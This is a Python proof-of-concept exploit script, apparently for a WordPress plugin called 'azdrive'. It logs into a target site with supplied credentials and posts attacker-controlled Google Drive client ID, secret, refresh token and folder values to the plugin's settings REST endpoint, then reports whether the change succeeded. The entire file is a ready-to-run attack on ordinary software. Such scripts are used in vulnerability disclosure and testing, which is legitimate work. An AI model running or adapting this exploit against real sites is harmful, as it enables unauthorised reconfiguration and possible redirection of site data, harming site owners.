import requests
import sys

def exploit(target_url, username, password):
    print(f"[+] Target     : {target_url}")
    print("[+] Logging in")

    session = requests.Session()
    login_url = target_url + "/wp-login.php"
    login_data = {
        "log": username,
        "pwd": password,
        "wp-submit": "Log In",
        "redirect_to": target_url + "/wp-admin/",
        "testcookie": "1"
    }

    login_resp = session.post(login_url, data=login_data, allow_redirects=False)

    if "wordpress_logged_in" not in "; ".join(session.cookies.get_dict().keys()):
        print("[-] Login failed.")
        return

    print("[+] Login Successful, Exploiting")

    exploit_url = target_url + "/wp-json/azdrive/v1/settings"
    payload = {
        "drive_type": "google",
        "google_client_id": "exploit-client-id",
        "google_client_secret": "exploit-client-secret",
        "google_refresh_token": "exploit-refresh-token",
        "google_folder_id": "exploit-folder"
    }

    headers = {
        "Content-Type": "application/json"
    }

    exploit_resp = session.post(exploit_url, json=payload, headers=headers)

    print("[+] Results:")
    if exploit_resp.status_code == 200:
        print("    [+] Exploit successful! Settings updated.")
    elif exploit_resp.status_code == 401:
        print("    [!] Exploit failed - Unauthorized (401). User lacks permission.")
    elif exploit_resp.status_code == 403:
        print("    [!] Exploit failed - Forbidden (403).")
    elif exploit_resp.status_code == 404:
        print("    [!] Exploit failed - Endpoint not found (404).")
    else:
        print(f"    [!] Exploit failed - HTTP {exploit_resp.status_code}")
        print("    [!] Response: ", exploit_resp.text)

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python3 azdrive_poc_a.py <target_url> <username> <password>")
        sys.exit(1)

    target = sys.argv[1].rstrip("/")
    user = sys.argv[2]
    pwd = sys.argv[3]

    exploit(target, user, pwd)
